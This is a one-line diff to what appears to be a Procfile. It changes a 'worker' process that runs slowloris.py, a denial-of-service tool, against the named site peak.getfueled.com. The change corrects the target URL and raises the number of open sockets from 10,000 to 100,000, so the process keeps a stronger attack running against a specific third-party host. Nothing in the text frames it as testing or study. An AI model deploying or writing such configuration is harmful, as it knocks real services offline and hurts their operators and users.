@@ -1,1 +1,1 @@
-worker: python3 slowloris.py peak.getfueled.com/#login -ua -s 10000
+worker: python3 slowloris.py https://peak.getfueled.com/ -ua -s 100000
